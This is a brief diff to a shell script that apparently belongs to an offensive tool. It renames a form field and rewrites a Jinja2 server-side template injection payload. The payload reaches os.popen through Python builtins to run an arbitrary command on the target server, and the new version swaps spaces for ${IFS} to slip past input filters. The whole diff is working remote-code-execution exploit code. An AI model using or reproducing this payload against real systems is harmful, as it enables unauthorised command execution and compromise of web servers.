@@ -10,6 +10,6 @@ CMD_FIELD=$(form_item "execute cmd" "cmd" "id")
 # Generate GUI form
 generate_form "${CMD_FIELD}"
 
-CMD=${form_data["file"]}
+CMD=${form_data["cmd"]}
 
-execute_command "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${CMD}').read() }}"
+execute_command "{{self.__init__.__globals__.__builtins__.__import__('os').popen('${CMD// /\$\{IFS\}}').read()}}"
